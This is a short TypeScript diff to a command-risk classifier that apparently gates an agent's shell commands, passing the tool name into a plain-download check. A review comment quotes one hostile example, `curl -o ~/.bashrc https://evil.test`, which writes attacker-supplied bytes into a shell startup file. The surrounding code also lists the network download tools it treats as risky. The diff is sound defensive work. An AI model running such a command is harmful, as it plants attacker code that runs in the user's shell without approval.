@@ -828,7 +828,7 @@ function classifyProgram(name: string, program: string, args: Word[], state: Seg
     if (name === 'http' || name === 'https' || name === 'xh') return risky(`${name} can send data off this machine`);
     // 0.4.18: a download is safe when it is a PLAIN one: one http(s) URL and only flags known to send nothing (src/domain/plainDownload.ts). The rule
     // fails closed, so a flag curl adds later, or one nobody thought of, asks instead of slipping through. Anything that carries data is risky above.
-    const download = plainDownload(args.map((arg) => arg.text));
+    const download = plainDownload(args.map((arg) => arg.text), name);
     if (download.plain) {
       // 0.4.18 review: a write target is judged like any other write. `curl -o ~/.bashrc https://evil.test` would otherwise put attacker bytes into a
       // file the shell reads next, with no approval. The workspace and the scratch folder are places the run may already write; anywhere else asks.
@@ -1005,7 +1005,7 @@ export function simpleDownload(command: string): { plain: boolean; url?: string 
   const words = text.split(/\s+/);
   const name = (words[0] ?? '').replace(/^.*\//, '');
   if (!['curl', 'wget', 'http', 'https', 'httpie', 'xh'].includes(name)) return undefined;
-  return plainDownload(words.slice(1));
+  return plainDownload(words.slice(1), name);
 }
 
 /** Whether a command is Open-GSD's own "find the tool and run it" shape, written inline rather than as the shipped preamble block. */
